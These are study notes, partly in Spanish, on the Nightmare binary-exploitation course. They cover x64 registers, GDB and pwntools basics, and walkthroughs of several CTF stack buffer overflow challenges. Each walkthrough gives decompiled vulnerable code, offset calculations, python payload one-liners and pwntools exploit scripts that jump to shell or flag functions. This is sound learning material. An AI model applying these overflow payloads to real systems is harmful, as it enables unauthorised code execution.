# Notas de Nightmare

[https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io/)

## 1 Introduction

### 1.1 Assembly

#### Registers

- rbp: Base Pointer, points to the bottom of the current stack frame
- rsp: Stack Pointer, points to the top of the current stack frame
- rip: Instruction Pointer, points to the instruction to be executed

**General Purpose Registers**
These can be used for a variety of different things

- rax
- rbx
- rcx
- rdx
- rsi
- rdi
- r8
- r9
- r10
- r11
- r12
- r13
- r14
- r15

In `x64` linux arguments to a function are passed via registers. The first few args are passed by these registers:

- rdi:    First Argument
- rsi:    Second Argument
- rdx:    Third Argument
- rcx:    Fourth Argument
- r8:     Fifth Argument
- r9:     Sixth Argument

| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |
|---|---|---|---|
| rbp | ebp | bp | bpl |
| rsp | esp | sp | spl |
| rip | eip |  |  |
| rax | eax | ax | al |
| rbx | ebx | bx | bl |
| rcx | ecx | cx | cl |
| rdx | edx | dx | dl |
| rsi | esi | si | sil |
| rdi | edi | di | dil |
| r8 | r8d | r8w | r8b |
| r9 | r9d | r9w | r9b |
| r10 | r10d | r10w | r10b |
| r11 | r11d | r11w | r11b |
| r12 | r12d | r12w | r12b |
| r13 | r13d | r13w | r13b |
| r14 | r14d | r14w | r14b |
| r15 | r15d | r15w | r15b |

In `x64` we will see the `8` byte registers. However in `x86` the largest sized registers we can use are the `4` byte registers like `ebp`, `esp`, `eip` etc. Now we can also use smaller registers, than the maximum sized registers for the architecture.

In `x64` there is the `rax`, `eax`, `ax`, and `al` register. The `rax` register points to the full `8`. The `eax` register is just the lower four bytes of the `rax` register. The `ax` register is the last `2` bytes of the `rax` register. Lastly the `al` register is the last byte of the `rax` register.

### 1.4 Debugginng with DBG

- `nexti` - will have you go instruction by intruction through the program, but will not step into function calls such as puts.
- `next` - which will take you through one line of code, but will step over function calls such as puts.
- `step` - which will take you through one line of code, but will step into function calls
- `stepi` - whch will take you through one instruction at a time, stepping into function calls.
- `x` - examine things.
- `x/a` - as an address.
- `x/10c` - as a number of characters.
- `x/s` - as a string.
- `x/g` - as a qword.
- `x/w` - as a dword.

### 1.5 Scripting with Python pwntools

- `p64(x)` - pack the integer as a least endian QWORD.
- `p32(x)` - pack the integer as a least endian DWORD.
- `u64(x)` - unpack a least endian QWORD and get it's integer value.
- `u32(x)` - unpack a least endian DWORD and get it's integer value.

## Cheatsheet

Visualizar ensamblador paginado:

```bash
objdump -D <binary> -M intel | less
```

### GDB

```bash
disassemble
disass
b *main+25
b *0x08048414
b *puts
info breakpoints
info b
i b
info registers
info frame
delete <breakpoint number>
del 2
d 2
x/a 0x08048451
x/10c 0x08048451
x/s 0x08048451
x/g 0x08048451
x/w 0x08048451
jump *0x08048451
j *0x08048451
```

## 2 Stack Buffer Overflows

### Tamu19 pwn1

```c
undefined4 main(undefined param_1)
{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &param_1;
  setvbuf(stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

```bash
python -c 'print "Sir Lancelot of Camelot\n" + "To seek the Holy Grail.\n" + "A" * 43 + "\xc8\x10\xa1\xde"'
```

### Just Do It!

```c
undefined4 main(undefined param_1)
{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;
  
  local_c = &param_1;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
```

```bash
python -c 'print "A" * 20 + "\x80\xa0\x04\x08"'
```

### CSAW 16 Warmup

```c
void main(void)
{
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(local_88,"%p\n",easy);
  write(1,local_88,9);
  write(1,&DAT_00400755,1);
  gets(local_48);
  return;
}
```

```c
void easy(void)
{
  system("cat flag.txt");
  return;
}
```

```bash
gef➤  b *main+134 # Dirección de leave
Breakpoint 1 at 0x4006a3
gef➤  r
Starting program: /Hackery/pod/modules/bof_callfunction/csaw16_warmup/warmup
-Warm Up-
WOW:0x40060d
>15935728
gef➤  search-pattern 15935728 # Buscar texto en memoria
[+] Searching '15935728' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602260 - 0x602268  →   "15935728"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde50 - 0x7fffffffde58  →   "15935728"
gef➤  i f # info frame
Stack level 0, frame at 0x7fffffffdea0:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7a05b97
 Arglist at 0x7fffffffde90, args:
 Locals at 0x7fffffffde90, Previous frame's sp is 0x7fffffffdea0
 Saved registers:
  rbp at 0x7fffffffde90, rip at 0x7fffffffde98
```

Calcular offset

```python
>>> 0x7fffffffde98 - 0x7fffffffde50 # rip - dirección donde se encontró el patrón
72
```

```bash
python -c 'print "A" * 72 + "\x0d\x06\x40\x00\x00\x00"' > /tmp/payload
```

### CSAW 18 Get It

main

```c
undefined8 main(void)
{
  char local_28 [32];
  
  puts("Do you gets it??");
  gets(local_28);
  return 0;
}
```

give_shell

```c
void give_shell(void)
{
  system("/bin/bash");
  return;
}
```

```text
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400470  puts@plt
0x0000000000400480  system@plt
0x0000000000400490  __libc_start_main@plt
0x00000000004004a0  gets@plt
0x00000000004004b0  __gmon_start__@plt
0x00000000004004c0  _start
0x00000000004004f0  deregister_tm_clones
0x0000000000400530  register_tm_clones
0x0000000000400570  __do_global_dtors_aux
0x0000000000400590  frame_dummy
0x00000000004005b6  give_shell # Saltar aquí
0x00000000004005c7  main
0x0000000000400600  __libc_csu_init
0x0000000000400670  __libc_csu_fini
0x0000000000400674  _fini
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:     push   rbp
   0x00000000004005c8 <+1>:     mov    rbp,rsp
   0x00000000004005cb <+4>:     sub    rsp,0x30
   0x00000000004005cf <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:    mov    edi,0x40068e
   0x00000000004005db <+20>:    call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:    mov    rdi,rax
   0x00000000004005e7 <+32>:    mov    eax,0x0
   0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:    mov    eax,0x0
   0x00000000004005f6 <+47>:    leave
   0x00000000004005f7 <+48>:    ret
End of assembler dump.
gef➤  b *0x00000000004005f6
Breakpoint 1 at 0x4005f6
gef➤  r
Starting program: /home/srrequiem/Documents/nightmare/modules/05-bof_callfunction/csaw18_getit/get_it
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc6000'
Do you gets it??
13371337
[...] # Output de gef
gef➤  i f
Stack level 0, frame at 0x7fffffffdc00:
 rip = 0x4005f6 in main; saved rip = 0x7ffff7dca20a
 Arglist at 0x7fffffffdbf0, args:
 Locals at 0x7fffffffdbf0, Previous frame's sp is 0x7fffffffdc00
 Saved registers:
  rbp at 0x7fffffffdbf0, rip at 0x7fffffffdbf8
gef➤  search-pattern 13371337
[+] Searching '13371337' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6026b0 - 0x6026ba  →   "13371337\n"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdbd0 - 0x7fffffffdbd8  →   "13371337"
```

Calcular offset

```python
>>> 0x7fffffffdbf8 - 0x7fffffffdbd0
40
```

Exploit

```python
from pwn import *

target = process("./get_it")
payload = b"A" * 40 # filler
payload += p64(0x4005b6) # get_shell mem address
target.sendline(payload)
target.interactive()
```

### TU 2017 Vulnchat

```c
undefined4 main(void)
{
  undefined local_31 [20];
  char local_1d [20];
  undefined4 local_9;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  local_9 = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",local_1d);
  __isoc99_scanf(&local_9,local_31);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

```c
void printFlag(void)
{
  system("/bin/cat ./flag.txt");
  puts("Use it wisely");
  return;
}
```

Modificación de espacio asignado para almacenar en:

```c
__isoc99_scanf(&local_9,local_1d);
```

Por lo que al identificar la dirección de memoria de `printFlag` con:

```text
gef➤  b *printFlag
Breakpoint 2 at 0x804856b
```

Se puede crear el payload con:

```bash
python -c 'print "A" * 20 + "%99s\n" + "A" * 49 + "\x6b\x85\x04\x08\n"' > /tmp/payload
```

Donde:

- `"A" * 20`: Rellenan la variable del primer saludo (`local_1d`).
- `%99s`: Da espacio suficiente para alcanzar la dirección de retorno para el siguiente `scanf`.
- `"A" * 49`: Rellenan el espacio necesario para alcanzar la dirección de retorno.
- `"\x6b\x85\x04\x08"`: Dirección de `printFlag`.

Exploit:

```python
from pwn import *

target = process("./vuln-chat")
payload = b"A" * 20
payload += b"%99s"
target.sendline(payload)
payload = b"A" * 49
payload += p32(0x804856b)
target.sendline(payload)
target.interactive()
```


## Exploit template

```python
from pwn import *

target = remote("github.com", 9000)
target = process("./challenge")
gdb.attach(target)
# gdb.attach(target, gdbscript='b *main')
target.send(x)
target.sendline(x)
print target.recvline()
print target.recvuntil("out")
target.interactive()
```

## References

- [Nightmare](https://guyinatuxedo.github.io/).
- [Pwn College](https://pwn.college/).
- [Exploit Education](https://exploit.education/).
- https://github.com/hugsy/gef
- https://github.com/pwndbg/pwndbg
- https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8
- 